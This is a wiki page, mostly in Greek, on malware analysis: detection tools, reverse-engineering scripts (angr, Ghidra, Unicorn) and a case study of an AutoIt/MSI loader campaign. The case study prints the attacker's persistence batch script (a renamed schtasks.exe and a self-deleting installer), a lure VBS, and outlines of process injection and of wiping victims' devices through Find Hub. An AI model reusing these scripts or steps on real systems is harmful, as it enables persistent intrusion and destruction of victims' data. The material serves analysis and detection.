# Ανάλυση Κακόβουλου Λογισμικού

{{#include ../../banners/hacktricks-training.md}}

## CheatSheets Διερεύνησης (Forensics)

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Διαδικτυακές Υπηρεσίες

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Εργαλεία Antivirus και Ανίχνευσης εκτός σύνδεσης

### Yara

#### Εγκατάσταση
```bash
sudo apt-get install -y yara
```
#### Προετοιμασία κανόνων

Χρησιμοποιήστε αυτό το script για να κατεβάσετε και να συγχωνεύσετε όλους τους yara malware κανόνες από github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Δημιουργήστε τον _**rules**_ κατάλογο και εκτελέστε το. Αυτό θα δημιουργήσει ένα αρχείο με όνομα _**malware_rules.yar**_ το οποίο περιέχει όλους τους yara κανόνες για malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Σάρωση
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Έλεγχος για malware και Δημιουργία κανόνων

Μπορείτε να χρησιμοποιήσετε το εργαλείο [**YaraGen**](https://github.com/Neo23x0/yarGen) για να δημιουργήσετε yara rules από ένα binary. Δείτε αυτούς τους οδηγούς: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Εγκατάσταση
```
sudo apt-get install -y clamav
```
#### Σάρωση
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** ανιχνεύει ενδεχομένως κακόβουλες **capabilities** σε εκτελέσιμα: PE, ELF, .NET. Έτσι θα βρει πράγματα όπως Att\&ck tactics, ή ύποπτες capabilities όπως:

- check for OutputDebugString error
- run as a service
- create process

Κατέβασέ το από το [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC σημαίνει Indicator Of Compromise. Ένα IOC είναι ένα σύνολο **conditions that identify** κάποιο πιθανώς ανεπιθύμητο λογισμικό ή επιβεβαιωμένο **malware**. Οι Blue Teams χρησιμοποιούν αυτόν τον τύπο ορισμού για να **search for this kind of malicious files** στα **systems** και **networks** τους.\
Το να μοιράζεστε αυτούς τους ορισμούς είναι πολύ χρήσιμο, καθώς όταν ένα malware εντοπίζεται σε έναν υπολογιστή και δημιουργείται ένα IOC για αυτό, άλλες Blue Teams μπορούν να το χρησιμοποιήσουν για να εντοπίσουν το malware πιο γρήγορα.

Ένα εργαλείο για τη δημιουργία ή τροποποίηση IOCs είναι [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [**Redline**](https://www.fireeye.com/services/freeware/redline.html) για να **search for defined IOCs in a device**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) είναι ένας scanner για Simple Indicators of Compromise.\
Η ανίχνευση βασίζεται σε τέσσερις detection methods:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) είναι ένας σαρωτής malware για Linux που κυκλοφορεί υπό την άδεια GNU GPLv2 και έχει σχεδιαστεί για τις απειλές που αντιμετωπίζουν τα κοινόχρηστα περιβάλλοντα φιλοξενίας. Χρησιμοποιεί δεδομένα απειλών από συστήματα ανίχνευσης εισβολών στο όριο του δικτύου για να εξάγει malware που χρησιμοποιείται ενεργά σε επιθέσεις και να δημιουργεί υπογραφές για ανίχνευση. Επιπλέον, δεδομένα απειλών προέρχονται επίσης από υποβολές χρηστών μέσω της LMD checkout feature και από πόρους της κοινότητας malware.

### rkhunter

Εργαλεία όπως [**rkhunter**](http://rkhunter.sourceforge.net) μπορούν να χρησιμοποιηθούν για να ελέγξουν το σύστημα αρχείων για πιθανά **rootkits** και malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) είναι ένα εργαλείο που προσπαθεί να βρει obfuscated strings μέσα σε executables χρησιμοποιώντας διάφορες τεχνικές.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)ελέγχει μερικά βασικά πράγματα μέσα στο executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) είναι ένα εργαλείο που επιτρέπει τη λήψη πληροφοριών για Windows executables όπως imports, exports, headers, αλλά επίσης θα ελέγξει το virus total και θα βρει potential Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) είναι ένα εργαλείο για να ανιχνεύσει εάν ένα αρχείο είναι **encrypted** και επίσης να βρει **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)είναι ένα Python script που χρησιμοποιεί μια ποικιλία **statistical methods** για να εντοπίσει **obfuscated** και **encrypted** περιεχόμενο μέσα σε text/script files. The intended purpose of NeoPI is to aid in the **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) κάνει το καλύτερο δυνατό για να ανιχνεύσει **obfuscated**/**dodgy code** καθώς και αρχεία που χρησιμοποιούν **PHP** functions που συχνά χρησιμοποιούνται σε **malwares**/webshells.

### Apple Binary Signatures

Κατά τον έλεγχο κάποιου **malware sample** θα πρέπει πάντα να **check the signature** του binary αφού ο **developer** που το υπέγραψε μπορεί ήδη να είναι **related** με **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Τεχνικές Ανίχνευσης

### File Stacking

If you know that some folder containing the **files** of a web server was **last updated on some date**. **Check** the **date** all the **files** in the **web server were created and modified** and if any date is **suspicious**, check that file.

### Baselines

If the files of a folder **shouldn't have been modified**, you can calculate the **hash** of the **original files** of the folder and **compare** them with the **current** ones. Anything modified will be **suspicious**.

### Statistical Analysis

When the information is saved in logs you can **check statistics like how many times each file of a web server was accessed as a web shell might be one of the most**.

---

### Android in-app native telemetry (no root)

On Android, you can instrument native code inside the target app process by preloading a tiny logger library before other JNI libs initialize. This gives early visibility into native behavior without system-wide hooks or root. A popular approach is SoTap: drop libsotap.so for the right ABI into the APK and inject a System.loadLibrary("sotap") call early (e.g., static initializer or Application.onCreate), then collect logs from internal/external paths or Logcat fallback.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Some Android malware and RASP-protected apps hide JNI method names and signatures by decoding them at runtime before calling RegisterNatives. When Frida/ptrace instrumentation is killed by anti-debug, you can still recover the plaintext offline by executing the in-binary decoder with angr and then pushing results back into Ghidra as comments.

Key idea: treat the decoder inside the .so as a callable function, execute it on the obfuscated byte blobs in .rodata, and concretize the output bytes up to the first \x00 (C-string terminator). Keep angr and Ghidra using the same image base to avoid address mismatches.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr setup και εκτέλεση του decoder offline</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Σε μεγάλη κλίμακα, κατασκευάστε έναν στατικό χάρτη των call sites προς τα επιχειρήματα του decoder (encoded_ptr, size). Τα wrappers μπορεί να κρύβουν επιχειρήματα, οπότε μπορείτε να δημιουργήσετε αυτόν τον χάρτη χειροκίνητα από τα Ghidra xrefs αν το API recovery είναι θορυβώδες.

<details>
<summary>Batch decode multiple call sites with angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Επισήμανση των σημείων κλήσης στο Ghidra
Επιλογή A: Συντάκτης σχολίων μόνο με Jython (χρήση ενός προηγουμένως υπολογισμένου JSON)
- Εφόσον το angr απαιτεί CPython3, κρατήστε τη deobfuscation και την επισήμανση ξεχωριστές. Πρώτα τρέξτε το angr script παραπάνω για να παράξετε το decoded_strings.json. Έπειτα τρέξτε αυτό το Jython GhidraScript για να γράψει PRE_COMMENTs σε κάθε σημείο κλήσης (και να συμπεριλάβει το όνομα της καλούσας συνάρτησης για συμφραζόμενα):

<details>
<summary>Ghidra Jython script για να σχολιάσει τα decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Επιλογή B: Single CPython script via pyhidra/ghidra_bridge
- Εναλλακτικά, χρησιμοποιήστε pyhidra ή ghidra_bridge για να χειριστείτε το API του Ghidra από την ίδια διεργασία CPython που τρέχει angr. Αυτό επιτρέπει την κλήση του decode_string() και τον άμεσο ορισμό των PRE_COMMENTs χωρίς ενδιάμεσο αρχείο. Η λογική αντικατοπτρίζει το Jython script: κατασκευάστε έναν χάρτη callsite→function μέσω του ReferenceManager, αποκωδικοποιήστε με angr και ορίστε τα σχόλια.

Γιατί αυτό λειτουργεί και πότε να το χρησιμοποιήσετε
- Η εκτέλεση εκτός σύνδεσης παρακάμπτει RASP/anti-debug: δεν απαιτείται ptrace ή Frida hooks για την ανάκτηση των συμβολοσειρών.
- Η διατήρηση της ευθυγράμμισης base_addr μεταξύ Ghidra και angr (π.χ. 0x00100000) εξασφαλίζει ότι οι διευθύνσεις λειτουργιών/δεδομένων ταιριάζουν μεταξύ των εργαλείων.
- Επαναλήψιμη συνταγή για decoders: αντιμετωπίστε τη μετασχηματισμό ως καθαρή συνάρτηση, δεσμεύστε έναν output buffer σε ένα φρέσκο state, καλέστε την με (encoded_ptr, out_ptr, len), στη συνέχεια concretize μέσω state.solver.eval και αναλύστε C-strings μέχρι το \x00.

Σημειώσεις και παγίδες
- Σεβαστείτε το target ABI/calling convention. Το angr.factory.callable επιλέγει ένα ανάλογα με το arch· αν τα επιχειρήματα φαίνονται μετατοπισμένα, ορίστε ρητά το cc.
- Αν ο decoder αναμένει μηδενισμένους output buffers, αρχικοποιήστε το outbuf με μηδενικά στο state πριν την κλήση.
- Για position-independent Android .so, δίνετε πάντα base_addr ώστε οι διευθύνσεις στο angr να ταιριάζουν με αυτές που βλέπει το Ghidra.
- Χρησιμοποιήστε currentProgram.getReferenceManager() για την αρίθμηση των call-xrefs ακόμα και αν η εφαρμογή τυλίγει τον decoder πίσω από thin stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Αποκρυπτογράφηση Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Σύγχρονες οικογένειες malware καταχρώνται έντονα την Control-Flow Graph (CFG) obfuscation: αντί για ένα άμεσο jump/call, υπολογίζουν τον προορισμό κατά το run-time και εκτελούν ένα `jmp rax` ή `call rax`. Ένας μικρός *dispatcher* (τυπικά εννέα εντολές) θέτει τον τελικό στόχο ανάλογα με τα CPU `ZF`/`CF` flags, καταστρέφοντας εντελώς την στατική ανάκτηση του CFG.

Η τεχνική — εμφανής στον loader SLOW#TEMPEST — μπορεί να νικηθεί με μια τριβηματική ροή εργασίας που βασίζεται μόνο σε IDAPython και τον εξομοιωτή CPU Unicorn.

### 1. Εντοπίστε κάθε indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Εξαγάγετε τον dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Προσομοιώστε το δύο φορές με Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Τρέξτε `run(code,0,0)` και `run(code,1,1)` για να λάβετε τους στόχους των κλάδων *ψευδής* και *αληθής*.

### 4. Επαναφορά ενός άμεσου jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Μετά το patching, αναγκάστε το IDA να αναλύσει ξανά τη συνάρτηση ώστε να επανέλθουν το πλήρες CFG και η έξοδος Hex-Rays:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Επισήμανση έμμεσων κλήσεων API

Μόλις γίνει γνωστός ο πραγματικός προορισμός κάθε `call rax` μπορείτε να πείτε στο IDA τι είναι ώστε οι τύποι παραμέτρων και τα ονόματα μεταβλητών να ανακτηθούν αυτόματα:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Πρακτικά οφέλη

* Επαναφέρει το πραγματικό CFG → decompilation πάει από *10* γραμμές σε χιλιάδες.
* Επιτρέπει string-cross-reference & xrefs, καθιστώντας την ανακατασκευή της συμπεριφοράς απλή.
* Scripts είναι επαναχρησιμοποιήσιμα: τοποθετήστε τα σε οποιοδήποτε loader που προστατεύεται από το ίδιο κόλπο.

---

## AutoIt-based loaders: αποκρυπτογράφηση .a3x, μασκάρισμα Task Scheduler και έγχυση RAT

Αυτό το μοτίβο εισβολής αλυσιδώνει ένα υπογεγραμμένο MSI, AutoIt loaders που έχουν μεταγλωττιστεί σε .a3x, και μια εργασία Task Scheduler που μασκαρεύεται ως μια αθώα εφαρμογή.

### MSI → custom actions → AutoIt ορχηστρωτής

Το δέντρο διεργασιών και οι εντολές που εκτελούνται από τις MSI custom actions:

- MsiExec.exe → cmd.exe για να τρέξει install.bat
- WScript.exe για να εμφανίσει ένα παραπλανητικό παράθυρο σφάλματος
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (τοποθετεί loader, ρυθμίζει persistence, αυτοκαθαρίζεται):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (δόλωμα χρήστη):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Αποθέτει AutoIt3.exe και IoKlTr.au3 σε C:\Users\Public\Music
- Αντιγράφει schtasks.exe σε hwpviewer.exe (παρουσιάζεται ως Hangul Word Processor viewer)
- Creates a scheduled task "IoKlTr" που εκτελείται κάθε 1 λεπτό
- Το Startup LNK εμφανίζεται ως Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Τοποθετεί modules υπό %APPDATA%\Google\Browser\ υποφακέλους που περιέχουν `adb` ή `adv` και τα ξεκινά μέσω βοηθητικών autoit.vbs/install.bat

Forensic triage tips:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Αναζητήστε μετονομασμένα αντίγραφα του schtasks.exe που βρίσκονται μαζί με το Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Συνήθεις διαδρομές: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Συσχετίστε δημιουργία διεργασιών: AutoIt3.exe εκκινεί νομότυπα Windows binaries (π.χ. cleanmgr.exe, hncfinder.exe)

### AutoIt loaders και αποκρυπτογράφηση .a3x payload → injection

- Τα AutoIt modules compilάρονται με `#AutoIt3Wrapper_Outfile_type=a3x` και αποκρυπτογραφούν ενσωματωμένα payloads πριν τα εγχύσουν σε μη κακόβουλες διεργασίες.
- Παρατηρούμενες οικογένειες: QuasarRAT (injected into hncfinder.exe) και RftRAT/RFTServer (injected into cleanmgr.exe), καθώς και RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Σχήμα αποκρυπτογράφησης: παράγεται ένα AES key μέσω HMAC, αποκρυπτογραφείται το ενσωματωμένο blob, και έπειτα εγχύεται το plaintext module.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Κοινή ροή έγχυσης (CreateRemoteThread-style):
- CreateProcess (suspended) του target host (π.χ., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory με decrypted module/shellcode
- CreateRemoteThread ή QueueUserAPC για εκτέλεση του payload

Ιδέες για ανίχνευση
- AutoIt3.exe με γονικό process MsiExec.exe ή WScript.exe που εκκινεί εργαλεία συστήματος
- Αρχεία με κατάληξη `.a3x` ή AutoIt script runners σε δημόσιους/από χρήστη εγγράψιμους φακέλους
- Suspicious scheduled tasks που εκτελούν AutoIt3.exe ή binaries μη υπογεγραμμένα από Microsoft, με triggers σε επίπεδο λεπτών

### Κατάχρηση ανάληψης λογαριασμού του Android Find My Device (Find Hub)

Κατά τη διάρκεια της παραβίασης σε Windows, οι χειριστές χρησιμοποίησαν κλεμμένα διαπιστευτήρια Google για να διαγράψουν επανειλημμένα τις Android συσκευές του θύματος, καταστέλλοντας τις ειδοποιήσεις ενώ επέκτειναν την πρόσβαση μέσω του συνδεδεμένου desktop messenger του θύματος.

Βήματα χειριστή (από συνεδρία browser με σύνδεση):
- Ελέγξτε Google Account → Security → Your devices; ακολουθήστε Find My Phone → Find Hub (https://www.google.com/android/find)
- Επιλέξτε συσκευή → εισάγετε ξανά τον Google κωδικό → εκτελέστε "Erase device" (factory reset); επαναλάβετε για να καθυστερήσετε την ανάκτηση
- Προαιρετικά: διαγράψτε τα alert e-mails στο συνδεδεμένο mailbox (π.χ., Naver) για να αποκρύψετε τις ειδοποιήσεις ασφαλείας

## AdaptixC2: Configuration Extraction and TTPs

Δείτε την αφιερωμένη σελίδα:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Αναφορές

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
